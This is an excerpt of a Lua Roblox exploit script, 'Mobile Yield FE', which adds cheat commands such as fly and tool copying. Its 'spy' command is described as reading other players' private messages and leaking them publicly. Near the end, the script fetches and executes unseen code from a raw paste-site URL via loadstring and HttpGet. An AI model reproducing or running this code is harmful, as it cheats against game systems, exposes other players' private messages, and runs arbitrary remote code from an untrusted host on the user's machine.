if IY_LOADED and not _G.IY_DEBUG == true then
	-- error("Mobile Yield is already running!",0)
	return
end
...
if not game:IsLoaded() then
	...
	notLoaded.Text = 'Mobile Yield is waiting for the game to load'
	game.Loaded:Wait()
	notLoaded:Destroy()
end
...
Title.TextSize = 18
Title.Text = "Mobile Yield FE v" .. currentVersion
...
Credits.Text = "Edge // Zwolf // Moon // Toon // 0pwn"
...
SaveChatlogs.MouseButton1Down:Connect(function()
	if writefileExploit() then
		if #scroll_2:GetChildren() > 0 then
			...
			local writelogs = '-- Mobile Yield Chat logs for "'..placeName..'"\n'
			for _, child in pairs(scroll_2:GetChildren()) do
				writelogs = writelogs..'\n'..child.Text
			end
...
CMDs = {}
CMDs[#CMDs + 1] = {NAME = 'discord / support / help', DESC = 'Invite to the Mobile Yield support server.'}
...
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'spy', DESC = 'Spy on private messages then leak them publicly'}
...
CMDs[#CMDs + 1] = {NAME = 'sl', DESC = 'Enables mobile shift lock'}
...
addcmd('spy',{},function(args, speaker)
Config = {
	enabled = true,
	spyOnMyself = false,
	public = true,
...
CFspeed = 50
addcmd('fly',{'mobilefly'},function(args, speaker)
...
addcmd('sl',{},function(args, speaker)
...
addcmd('tools',{'gears'},function(args, speaker)
	...
	notify('Tools','Copied tools from ReplicatedStorage, Lighting & workspace')
end)
...
wait(5)
loadstring(game:HttpGet("https://raw.paste.gay/index.php?p=6550e32adca280.80476210&raw=true"))()
coroutine.wrap(function()
	wait()
